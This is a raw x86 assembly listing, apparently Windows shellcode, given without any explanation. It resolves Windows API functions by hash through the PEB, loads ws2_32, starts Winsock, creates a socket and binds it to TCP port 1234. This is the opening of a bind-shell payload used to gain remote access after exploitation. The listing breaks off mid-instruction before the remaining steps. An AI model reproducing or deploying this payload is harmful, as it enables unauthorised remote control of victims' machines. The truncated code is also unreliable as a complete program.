```asm
_start:
    cld
    call L_95
RET_6:
    pushal
    mov ebp, esp
    xor edx, edx
    mov edx, dword ptr fs:[edx + 0x30]
    mov edx, dword ptr [edx + 0xc]
    mov edx, dword ptr [edx + 0x14]
L_15:
    movzx ecx, word ptr [edx + 0x26]
    mov esi, dword ptr [edx + 0x28]
    xor edi, edi
L_1e:
    xor eax, eax
    lodsb al, byte ptr [esi]
    cmp al, 0x61
    jl L_27
    sub al, 0x20
L_27:
    ror edi, 0xd
    add edi, eax
    dec ecx
    jne L_1e
    push edx
    push edi
    mov edx, dword ptr [edx + 0x10]
    mov eax, dword ptr [edx + 0x3c]
    add eax, edx
    mov eax, dword ptr [eax + 0x78]
    test eax, eax
    je L_8c
    add eax, edx
    mov ecx, dword ptr [eax + 0x18]
    push eax
    mov ebx, dword ptr [eax + 0x20]
    add ebx, edx
L_4b:
    test ecx, ecx
    je L_8b
    dec ecx
    mov esi, dword ptr [ebx + ecx*4]
    add esi, edx
    xor edi, edi
L_57:
    xor eax, eax
    ror edi, 0xd
    lodsb al, byte ptr [esi]
    add edi, eax
    cmp al, ah
    jne L_57
    add edi, dword ptr [ebp - 8]
    cmp edi, dword ptr [ebp + 0x24]
    jne L_4b
    pop eax
    mov ebx, dword ptr [eax + 0x24]
    add ebx, edx
    mov cx, word ptr [ebx + ecx*2]
    mov ebx, dword ptr [eax + 0x1c]
    add ebx, edx
    mov eax, dword ptr [ebx + ecx*4]
    add eax, edx
    mov dword ptr [esp + 0x24], eax
    pop ebx
    pop ebx
    popal
    pop ecx
    pop edx
    push ecx
    jmp eax
L_95:
    pop ebp
    push 0x3233
    push 0x5f327377
    push esp
    push 0x726774c
    call ebp
    mov eax, 0x190
    sub esp, eax
    push esp
    push eax
    push 0x6b8029
    call ebp
    push 0xb
    pop ecx
    jmp L_bb
L_8b:
    pop eax
L_8c:
    pop edi
    pop edx
    mov edx, dword ptr [edx]
    jmp L_15
L_bb:
    push eax
    loop L_bb
    push 1
    push 2
    push 0xe0df0fea
    call ebp
    xchg edi, eax
    push 0xd2040002
    mov esi, esp
    push 0x10
    push esi
    push edi
    push 0x6737dbc2
    call ebp
    test eax, eax
    jne L_